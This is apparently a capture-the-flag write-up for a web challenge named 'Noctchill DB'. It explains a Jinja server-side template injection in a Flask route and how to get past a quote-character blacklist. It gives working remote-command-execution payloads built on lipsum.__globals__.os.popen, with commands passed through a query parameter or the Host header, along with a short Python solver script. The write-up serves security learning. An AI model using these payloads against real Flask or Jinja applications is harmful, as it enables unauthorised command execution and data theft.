# Web - Noctchill DB
* Given source code and link to a website and lets say `target`.
* Try visit `target/{{7*7}}` the page will show `49`, and try visit `target/{{'test'}}` the page will show `Hacking Attempt!` because we can't use `', "` since it includes on blacklist. 
* `<idol>` are rendered in page, it happens because the application didn't find idol data with index `<idol>` on idols dictionary, so application enter block of exception. Check out the part-of `app.py` below :
```
...
                render = render_template('404.html', idol=idol)
            return render_template_string(render)
...
```
* We can exploit route `target/<idol>` by using Server Side Template Injection Attack. But there is filter on ahead. We must create a payload without containing any character and word in blacklist.
* Jinja has builtin function [lipsum()]('https://jinja.palletsprojects.com/en/2.9.x/templates/#lipsum') on global scope. Then, we can access os module by using `__globals__` python builtin function. `lipsum.__globals__.os.popen(<cmd>).read()`
* `target/{{lipsum.__globals__.os.popen('ls').read()}}` will show `Hacking Attempt!`, to bypass this we can send our command through Host HTTP Header then we can access it using `request.host` or we can send through parameter `request.args.yourparam`.
* Our payload will look like this.
  `target/{{lipsum.__globals__.os.popen(request.args.cmd).read()}}?cmd=whoami`
* cat flag 
  `target/{{lipsum.__globals__.os.popen(request.args.cmd).read()}}?cmd=cat /flag*`

# My Solver
```
import requests
import re
import sys

url = "http://target/"

payload = '{{lipsum.__globals__.os.popen(request.host).read()}}'

r = requests.get(url+payload, headers={
    "Host": sys.argv[1]
})

print(r.text)
```